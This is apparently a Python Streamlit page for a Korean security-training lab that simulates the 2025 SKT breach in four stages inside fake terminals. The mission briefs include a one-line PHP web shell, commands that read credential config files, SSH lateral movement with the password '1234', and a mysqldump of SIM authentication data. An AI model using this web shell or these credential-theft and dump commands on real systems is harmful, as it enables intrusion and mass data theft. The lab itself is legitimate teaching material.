import streamlit as st
from components import fake_terminal, section_header, vuln_box, done_hint
from config import R1, R2, R3, R4, SERVER_B_IP
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

def render():
    st.markdown("""<div style="color:#dc2626;font-size:13px;font-weight:700;
        letter-spacing:2px;padding:14px 0 6px 0;">🗡️ ATTACK SCENARIO — 4 STAGES</div>""",
        unsafe_allow_html=True)
    st.info("💡 각 단계를 순서대로 진행하세요. 터미널에서 ↑↓ 키로 명령어 히스토리를 탐색할 수 있습니다.")

    # STAGE 01
    with st.expander("  [ STAGE 01 ]  웹쉘 업로드 — T1190 Exploit Public-Facing Application", expanded=True):
        c1, c2 = st.columns([1, 1], gap="large")
        with c1:
            section_header("MISSION BRIEF")
            st.markdown("""
**상황:** DVWA에 파일 업로드 취약점이 존재하며
공격자가 이미 `shell.php`를 업로드했습니다.
웹쉘이 실제 실행되고 있는지 확인하세요.

**실제 사건 배경:**
2025년 4월, SKT 내부망에 공격자가 웹쉘을 업로드하여
`www-data` 권한으로 서버를 장악했습니다.
이 권한으로 설정 파일과 계정정보에 접근했습니다.

**업로드된 웹쉘:**
```php
<?php system($_GET['cmd']); ?>
```

**📌 실습 순서:**
```
whoami       ← 현재 실행 권한 확인
id           ← UID/GID 확인
ls -la       ← 업로드 폴더 목록
cat shell.php ← 웹쉘 코드 확인
uname -a     ← 서버 OS 정보
```
""")
            vuln_box([
                "파일 업로드 시 <b style='color:#ffd600;'>확장자 검증 없음</b>",
                ".php 파일이 서버에서 직접 실행됨",
                "공격자가 임의 OS 명령 실행 가능",
            ])
        with c2:
            section_header("TERMINAL — www-data@ServerA")
            fake_terminal("s1", R1, host="ServerA", user="www-data")
            done_hint("whoami → www-data 확인")
            if st.button("✅  STAGE 01 완료", key="btn1", use_container_width=True):
                st.session_state.completed["1단계: 웹쉘 업로드"] = True
                st.success("STAGE 01 CLEAR — 서버 장악 성공")
                st.balloons()

    # STAGE 02
    with st.expander("  [ STAGE 02 ]  계정정보 탈취 — T1552 Unsecured Credentials"):
        c1, c2 = st.columns([1, 1], gap="large")
        with c1:
            section_header("MISSION BRIEF")
            st.markdown("""
**상황:** 서버 장악 후 내부 설정 파일에서
평문으로 저장된 내부 서버 계정정보를 찾아내세요.

**실제 사건 배경:**
SKT 사건에서 웹 서버 설정 파일에
내부망 DB 서버 접속 정보가 **평문**으로 저장되어 있었습니다.
공격자는 이를 통해 코어망 진입 경로를 확보했습니다.

**📌 실습 순서:**
```
ls /var/www/html/dvwa/config/
cat /var/www/html/dvwa/config/server_info.txt
cat /var/www/html/dvwa/config/db.php
```
ServerB의 IP / USER / PASS를 메모하세요.
""")
            vuln_box([
                "<b style='color:#ffd600;'>Hardcoded Credentials</b> — 계정정보 평문 저장",
                "서버 하나 탈취 시 내부망 전체 계정 노출",
                "Secrets Manager / Vault 미사용",
            ])
        with c2:
            section_header("TERMINAL — www-data@ServerA")
            fake_terminal("s2", R2, host="ServerA", user="www-data")
            done_hint("ServerB IP / USER / PASS 확인")
            if st.button("✅  STAGE 02 완료", key="btn2", use_container_width=True):
                st.session_state.completed["2단계: 계정정보 탈취"] = True
                st.success("STAGE 02 CLEAR — 계정정보 탈취 성공")

    # STAGE 03
    with st.expander(f"  [ STAGE 03 ]  Lateral Movement — T1021 Remote Services (SSH)"):
        c1, c2 = st.columns([1, 1], gap="large")
        with c1:
            section_header("MISSION BRIEF")
            st.markdown(f"""
**상황:** 탈취한 계정정보로 내부 DB 서버에 SSH 접속합니다.
시스템 관리망(ServerA) → 코어망(ServerB) 이동.

**실제 사건 배경:**
SKT 사건에서 공격자는 탈취한 `dbadmin` 계정으로
코어망 DB 서버에 SSH 접속했습니다.
이 서버에는 2,696만 명의 유심 정보가 존재했습니다.

**📌 실습 순서:**
```
ping {SERVER_B_IP}
nmap -p 22,3306 {SERVER_B_IP}
ssh dbadmin@{SERVER_B_IP}
```
비밀번호: `1234`

`[dbadmin@ServerB ~]$` 뜨면 성공!
""")
            vuln_box([
                "<b style='color:#ffd600;'>내부망 간 SSH 무제한 허용</b>",
                "네트워크 세그멘테이션 미적용",
                "MFA 없는 단순 패스워드 인증",
                "취약 패스워드(1234) 사용",
            ])
        with c2:
            section_header("TERMINAL — ec2-user@ServerA")
            fake_terminal("s3", R3, host="ServerA", user="ec2-user")
            done_hint("[dbadmin@ServerB ~]$ 프롬프트 확인")
            if st.button("✅  STAGE 03 완료", key="btn3", use_container_width=True):
                st.session_state.completed["3단계: Lateral Movement"] = True
                st.success("STAGE 03 CLEAR — 코어망 침투 성공")

    # STAGE 04
    with st.expander("  [ STAGE 04 ]  DB 데이터 탈취 — T1005 Data from Local System"):
        c1, c2 = st.columns([1, 1], gap="large")
        with c1:
            section_header("MISSION BRIEF")
            st.markdown("""
**상황:** DB 서버에서 유심 정보 테이블을 조회하고 전체 덤프합니다.

**실제 사건 배경:**
SKT 사건에서 공격자는 `simdb` DB에서
- **ICCID** — 유심 고유번호
- **IMSI** — 가입자 식별번호
- **Ki** — 유심 인증 키 ← 유심 복제 핵심값
- **OPc** — 운영자 인증 파라미터

총 **9.82GB, 2,696만 건** 유출.
Ki값 노출 시 유심 복제 → 통신 도감청 가능.

**📌 실습 순서:**
```sql
mysql -u dbadmin -p1234 simdb
show tables;
describe usim;
SELECT COUNT(*) FROM usim;
SELECT * FROM usim;
mysqldump -u dbadmin -p1234 simdb > /tmp/stolen_data.sql
ls -lh /tmp/stolen_data.sql
```
""")
            vuln_box([
                "<b style='color:#ffd600;'>DB 저장 데이터 암호화 없음</b>",
                "Ki값 평문 저장 → 탈취 즉시 유심 복제 가능",
                "DB 대용량 덤프 이상 감지 없음",
                "접근 감사(Audit Log) 미비",
            ])
        with c2:
            section_header("TERMINAL — dbadmin@ServerB")
            fake_terminal("s4", R4, host="ServerB", user="dbadmin")
            done_hint("9.82GB 덤프 파일 생성 확인")
            if st.button("✅  STAGE 04 완료", key="btn4", use_container_width=True):
                st.session_state.completed["4단계: DB 탈취"] = True
                st.success("STAGE 04 CLEAR")
                st.error("💀 공격 시나리오 완료 — 2,696만 건 유출 시뮬레이션")